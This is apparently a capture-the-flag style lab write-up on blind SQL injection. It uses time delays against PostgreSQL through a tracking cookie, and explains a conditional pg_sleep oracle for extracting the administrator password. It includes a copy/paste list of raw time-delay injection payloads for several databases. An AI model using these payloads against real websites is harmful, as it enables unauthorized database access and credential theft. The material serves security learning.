# Blind SQL injection with time delays and information retrieval

*A clean, step‑by‑step write‑up using my original flow and **raw payloads** (no URL‑encoding), with tiny typo fixes and minimal notes.*

---

## 🎯 Goal
**Get the password for the `administrator` user and log in.**

---

## ✅ My Exact Steps (verbatim, lightly corrected)

1. **GOAL:** get password for administrator user and log in  
2. **Finding vulnerable parameter:** after going over all the params I could find, I realized it might be **blind SQLi**.  
3. **Try the time‑sleep payloads we know:**  
   ```text
   '+||+DBMS_SESSION.SLEEP(1)--, '+||+pg_sleep(1)--, '+||+sleep(1)--, '+||+WAITFOR DELAY+'0:0:1'--, '+||+111111111111.....--
   ```
4. **Cookie test that works:**  
   ```text
   TrackingId=peqSgovlyvTEa2WS'+||+pg_sleep(1)--
   ```
5. We know it’s **PostgreSQL**, and we need the password, so let’s look for **IF**-style logic in Postgres.  
6. **Boolean time test:**  
   ```text
   '+||+(SELECT CASE WHEN (1=1) THEN pg_sleep(1) END)--
   ```
   → this **works**, while `1=2` doesn’t delay.  
7. **Automation time** (see `automation.py`).  
8. **Grab the password** and log in as **administrator**.  
9. **Lab solved!** ✅

---

## 🧠 Why This Works (minimal notes)
- The vulnerable sink concatenates the cookie into a **string expression**. Using `||` forces evaluation of the function call (`pg_sleep`) even though the value isn’t displayed.  
- Wrapping `pg_sleep` in a scalar subquery with `CASE WHEN ...` gives a **boolean‑driven delay**: true ⇒ **sleep**, false ⇒ **no sleep**. That’s your **time‑based oracle**.  
- Quick DB cheat sheet for sleeps:  
  - **PostgreSQL:** `pg_sleep( seconds )`  
  - **Oracle:** `DBMS_LOCK.SLEEP( seconds )` (sometimes `DBMS_SESSION.SLEEP`)  
  - **SQL Server:** `WAITFOR DELAY '00:00:10'`  
  - **MySQL:** `SLEEP( seconds )`

> If the subquery form is required by the sink, try: `'||(SELECT pg_sleep(10))||'` or `'||(SELECT CASE WHEN <cond> THEN pg_sleep(1) END)||'`

---

## ⌨️ Raw Payloads (copy/paste — exactly as used)
```text
'+||+DBMS_SESSION.SLEEP(1)--
'+||+pg_sleep(1)--
'+||+sleep(1)--
'+||+WAITFOR DELAY+'0:0:1'--
'+||+111111111111.....--
TrackingId=peqSgovlyvTEa2WS'+||+pg_sleep(1)--
'+||+(SELECT CASE WHEN (1=1) THEN pg_sleep(1) END)--
'+||+pg_sleep(10)--
```

---

## 🏁 Result
- Built a **time‑based boolean oracle** using cookie concatenation and `pg_sleep`, automated the character search, **retrieved the admin password**, and logged in. **Solved. ✅**
